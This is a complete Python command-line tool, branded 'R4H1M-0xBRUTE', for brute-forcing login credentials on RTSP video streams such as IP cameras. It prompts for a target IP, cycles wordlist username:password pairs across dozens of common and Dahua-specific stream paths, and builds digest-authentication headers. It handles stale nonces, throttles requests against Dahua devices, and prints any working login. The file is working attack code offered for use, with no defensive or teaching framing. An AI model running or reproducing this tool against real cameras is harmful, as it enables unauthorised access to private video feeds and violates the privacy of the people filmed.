import socket
import hashlib
import threading
import sys
import pyfiglet
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import time
import concurrent.futures
import multiprocessing
import random

CPU_CORES = multiprocessing.cpu_count()
MAX_THREADS = CPU_CORES * 25    


BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PATHLIST = os.path.join(BASE_DIR, "Lib/path.txt")


ascii_banner = pyfiglet.figlet_format("R4H1M-0xBRUTE")
print(f"\033[1;36m{ascii_banner}\033[0m")


def stream_passwords(path):
    try:
        with open(path, "r", encoding="latin-1", errors="ignore") as f:
            for line in f:
                pwd = line.strip()
                if pwd:
                    yield pwd
    except FileNotFoundError:
        print(f"[ERROR] Password file not found: {path}")
        sys.exit(1)


def load_list(file_path):
    try:
        with open(file_path, "r", encoding="latin-1", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[ERROR] File not found: {file_path}")
        return []


def ask_target():
    global TARGET_IP, PORT
    print("=== RTSP Bruteforce Tool ===")
    TARGET_IP = input("Enter target IP address: ").strip()
    try:
        PORT = int(input("Enter port (default 554): ").strip() or 554)
    except:
        print("Invalid port.")
        sys.exit(1)

ask_target()


COMMON_PATHS = [
    "/", "/live.sdp", "/h264.sdp", "/mpeg4", "/ch0_0.h264",
    "/video", "/video.sdp", "/video1", "/stream1", "/stream2",
    "/stream.sdp", "/live", "/live/ch00_0", "/h264", "/h264_ulaw.sdp",
    "/h264_pcm.sdp", "/cam1", "/camera", "/cam", "/media/video1",
    "/media/video2", "/av0_0", "/av0_1", "/ch1", "/ch0",
    "/snapshot", "/live0", "/live1", "/Streaming/Channels/1",
    "/Streaming/Channels/101", "/0", "/1"
]


DAHUA_PATHS = [
    "/cam/realmonitor?channel=1&subtype=0",
    "/cam/realmonitor?channel=1&subtype=1",
    "/cam/realmonitor?channel=2&subtype=0",
    "/cam/realmonitor?channel=2&subtype=1",
    "/cam/realmonitor?channel=3&subtype=0",
    "/cam/realmonitor?channel=3&subtype=1",
    "/live", "/live/ch00_0", "/h264",
    "/Streaming/Channels/1",
    "/Streaming/Channels/101"
]


def ask_wordlists():
    global WORDLIST_MODE, COMBOLIST, SINGLE_USERNAME, PASSLIST
    global SINGLE_PATH_MODE, CUSTOM_PATH

    print("\n=== Wordlist Options ===")
    print("1. Combined wordlist (username:password)")
    print("2. Single username + password list")
    print("3. Default combined wordlist")

    choice = input("Select (1/2/3): ").strip()

    if choice == "1":
        WORDLIST_MODE = 1
        COMBOLIST = input("Path for combined wordlist: ").strip() or os.path.join(BASE_DIR, "Lib/wordlist.txt")
    elif choice == "2":
        WORDLIST_MODE = 2
        SINGLE_USERNAME = input("Single username: ").strip()
        PASSLIST = input("Password list path: ").strip()
    else:
        WORDLIST_MODE = 1
        COMBOLIST = os.path.join(BASE_DIR, "Lib/wordlist.txt")
        print(f"[+] Using default → {COMBOLIST}")

    print("\n=== Path Options ===")
    print("1. Use all paths")
    print("2. Use single custom path")
    p = input("Select (1/2): ").strip()
    if p == "2":
        SINGLE_PATH_MODE = True
        CUSTOM_PATH = input("Enter full RTSP path (e.g., /live.sdp): ").strip()
    else:
        SINGLE_PATH_MODE = False

ask_wordlists()


def parse_combo(line):
    if ":" not in line:
        return None, None
    return tuple(line.split(":", 1))

def make_digest_header(username, password, method, uri, realm, nonce, qop="auth"):
    nc = "00000001"
    cnonce = "abcdef1234567890"
    ha1 = hashlib.md5(f"{username}:{realm}:{password}".encode()).hexdigest()
    ha2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()
    response = hashlib.md5(f"{ha1}:{nonce}:{nc}:{cnonce}:{qop}:{ha2}".encode()).hexdigest()
    return f'Digest username="{username}", realm="{realm}", nonce="{nonce}", uri="{uri}", algorithm=MD5, response="{response}", qop={qop}, nc={nc}, cnonce="{cnonce}"'

def detect_dahua(resp):
    resp_low = resp.lower()
    if "dahua" in resp_low or "linux, dahua" in resp_low or "ipc-hfw" in resp_low:
        return True
    if "realm=\"login\"" in resp_low:
        return True
    return False


print_lock = threading.Lock()
stop_flag = threading.Event()

def try_rtsp(username, password, path):
    if stop_flag.is_set():
        return

    uri = f"rtsp://{TARGET_IP}:{PORT}{path}"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((TARGET_IP, PORT))
    except:
        return

    try:
        s.send(f"DESCRIBE {uri} RTSP/1.0\r\nCSeq: 1\r\n\r\n".encode())
        resp = s.recv(1024).decode()
    except:
        s.close()
        return

    
    is_dahua = detect_dahua(resp)

    if "401 Unauthorized" not in resp:
        with print_lock:
            print(f"[OPEN] {uri}")
        s.close()
        return

    try:
        realm = resp.split('realm="')[1].split('"')[0]
        nonce = resp.split('nonce="')[1].split('"')[0]
    except:
        s.close()
        return


    if is_dahua and "stale=true" in resp.lower():
        try:
            s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s2.settimeout(5)
            s2.connect((TARGET_IP, PORT))
            s2.send(f"DESCRIBE {uri} RTSP/1.0\r\nCSeq: 3\r\n\r\n".encode())
            new_resp = s2.recv(1024).decode()
            s2.close()
            if "nonce=" in new_resp:
                nonce = new_resp.split('nonce="')[1].split('"')[0]
        except:
            pass

    auth_header = make_digest_header(username, password, "DESCRIBE", uri, realm, nonce)


    if is_dahua:
        time.sleep(0.05 + random.random() * 0.1)

    req2 = f"DESCRIBE {uri} RTSP/1.0\r\nCSeq: 2\r\nAuthorization: {auth_header}\r\n\r\n"

    try:
        s.send(req2.encode())
        resp2 = s.recv(1024).decode()

        if is_dahua and "stale=true" in resp2.lower():
            s3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s3.settimeout(5)
            s3.connect((TARGET_IP, PORT))
            s3.send(f"DESCRIBE {uri} RTSP/1.0\r\nCSeq: 4\r\n\r\n".encode())
            fix_resp = s3.recv(1024).decode()
            s3.close()
            if "nonce=" in fix_resp:
                nonce = fix_resp.split('nonce="')[1].split('"')[0]
                auth_header = make_digest_header(username, password, "DESCRIBE", uri, realm, nonce)
                req3 = f"DESCRIBE {uri} RTSP/1.0\r\nCSeq: 5\r\nAuthorization: {auth_header}\r\n\r\n"
                s.send(req3.encode())
                resp2 = s.recv(1024).decode()
    except:
        s.close()
        return

    s.close()

    if "200 OK" in resp2:
        if not stop_flag.is_set():
            stop_flag.set()
            with print_lock:
                print(f"\n[SUCCESS] {username}:{password} @ {uri}\n")
        return

    if stop_flag.is_set():
        return

    with print_lock:
        print(f"[FAIL] {username}:{password} @ {uri}")



def main():
    if WORDLIST_MODE == 1:
        combos = load_list(COMBOLIST)
    else:
        combos = (f"{SINGLE_USERNAME}:{p}" for p in stream_passwords(PASSLIST))


    if SINGLE_PATH_MODE:
        all_paths = [CUSTOM_PATH]
    else:
        user_paths = load_list(PATHLIST)
        all_paths = list(set(user_paths + COMMON_PATHS + DAHUA_PATHS))

    print(f"\n[+] Target: {TARGET_IP}:{PORT}")
    print(f"[+] Loaded {len(all_paths)} RTSP paths\n")


    MAX_THREADS = max(8, CPU_CORES * 2)
    print(f"[+] Optimized thread count: {MAX_THREADS}")

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []

        for combo in combos:
            if stop_flag.is_set():
                break

            username, password = parse_combo(combo)
            if not username:
                continue

            for path in all_paths:
                if stop_flag.is_set():
                    break
                futures.append(executor.submit(try_rtsp, username, password, path))


            if len(futures) > 5000:
                for future in as_completed(futures):
                    if stop_flag.is_set():
                        executor.shutdown(wait=False, cancel_futures=True)
                        return
                futures = []


        for future in as_completed(futures):
            if stop_flag.is_set():
                executor.shutdown(wait=False, cancel_futures=True)
                return

    if stop_flag.is_set():
        print("\n[+] Brute-force stopped: valid credentials found!")
    else:
        print("\n[-] Brute-force finished: no valid credentials found.")

if __name__ == "__main__":
    main()
